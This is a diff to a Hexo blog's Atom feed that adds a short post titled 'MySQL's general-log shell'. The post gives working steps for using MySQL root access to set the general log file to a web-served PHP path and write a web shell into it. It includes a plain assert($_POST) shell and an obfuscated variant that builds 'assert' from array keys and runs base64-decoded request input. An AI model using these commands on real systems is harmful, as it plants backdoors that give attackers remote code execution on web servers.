@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://10o0.github.io/"/>
-  <updated>2018-05-04T02:55:46.757Z</updated>
+  <updated>2018-06-04T02:54:38.898Z</updated>
   <id>https://10o0.github.io/</id>
   
   <author>
@@ -15,6 +15,40 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>MySQL&#39;s general-log shell</title>
+    <link href="https://10o0.github.io/2018/06/04/MySQL&#39;s%20general-log%20shell/"/>
+    <id>https://10o0.github.io/2018/06/04/MySQL&#39;s general-log shell/</id>
+    <published>2018-06-04T02:52:12.000Z</published>
+    <updated>2018-06-04T02:54:38.898Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>MySQL ROOT:</p></blockquote><pre><code>show variables like &apos;%general%&apos;;set global general_log=&apos;on&apos;;SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;;SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;;SELECT &quot;&lt;?php $p = array(&apos;f&apos;=&gt;&apos;a&apos;,&apos;pffff&apos;=&gt;&apos;s&apos;,&apos;e&apos;=&gt;&apos;fffff&apos;,&apos;lfaaaa&apos;=&gt;&apos;r&apos;,&apos;nnnnn&apos;=&gt;&apos;t&apos;);$a = array_keys($p);$_=$p[&apos;pffff&apos;].$p[&apos;pffff&apos;].$a[2];$_= &apos;a&apos;.$_.&apos;rt&apos;;$_(base64_decode($_REQUEST[&apos;cmd&apos;]));?&gt;&quot;;set global general_log = off;</code></pre>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;p&gt;MySQL ROOT:&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;show variables like &amp;apos;%general%&amp;apos;;
+set global general_log=&amp;apos;on&amp;apos;;
+S
+      
+    
+    </summary>
+    
+      <category term="shell" scheme="https://10o0.github.io/categories/shell/"/>
+    
+    
+      <category term="mysql" scheme="https://10o0.github.io/tags/mysql/"/>
+    
+      <category term="shell" scheme="https://10o0.github.io/tags/shell/"/>
+    
+      <category term="log" scheme="https://10o0.github.io/tags/log/"/>
+    
+  </entry>
   
   <entry>
     <title>Frp结合VPS打造外网Meatsploit</title>
@@ -281,9 +315,9 @@ chmod +x shadowsocks-all.sh
       <category term="笔记" scheme="https://10o0.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
     
     
-      <category term="msf" scheme="https://10o0.github.io/tags/msf/"/>
-    
       <category term="shell" scheme="https://10o0.github.io/tags/shell/"/>
+    
+      <category term="msf" scheme="https://10o0.github.io/tags/msf/"/>
     
   </entry>
   
